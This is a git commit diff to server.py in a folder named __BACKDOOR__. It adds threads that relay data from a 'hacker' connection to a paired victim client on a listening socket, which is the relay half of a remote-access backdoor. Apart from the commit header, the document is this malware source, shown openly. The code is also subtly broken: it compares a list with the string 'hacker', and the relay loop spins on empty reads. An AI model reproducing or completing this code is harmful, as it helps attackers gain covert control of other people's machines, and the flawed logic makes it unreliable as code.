b98fba5158b108cbadcb8de86d22f3ee2c7d7822
Hey-de <miginandrey@gmail.com>
2021-05-17 15:40:16 +0300

    Upgrading server

--- __BACKDOOR__/server.py
+++ __BACKDOOR__/server.py
@@ -1,23 +1,32 @@
 import socket as sock
-import keyboard
+import threading
 import sys
 s = sock.socket()
 s.bind(('', 9090))
 s.listen(1000)
 wait = []
+def remote(hacker, client):
+    while True:
+        data = hacker.recv(2048)
+        if not data:
+            continue
+        client.send(data)
+conn, addr = s.accept()
 while True:
-    keyboard.add_hotkey("ctrl+d", lambda: sys.exit(1))
-    conn, addr = s.accept()
     data = conn.recv(1024)
     data = data.decode()
     add = data.split("|")
     print(add)
     sucsess = False
-    for i, list in enumerate(wait):
-        if list[1] == add[1]:
+    for i, lst in enumerate(wait):
+        if lst[1] == add[1]:
             conn.send(b'200')
-            list[2].send(b'200')
-            wait[i] = None
+            lst[2].send(b'200')
+            if add == "hacker":
+                th = threading.Thread(target=remote, args=(conn, lst[2],))
+            else:
+                th = threading.Thread(target=remote, args=(lst[2], conn,))
+            th.start()
             sucsess = True
             break
     if not sucsess:
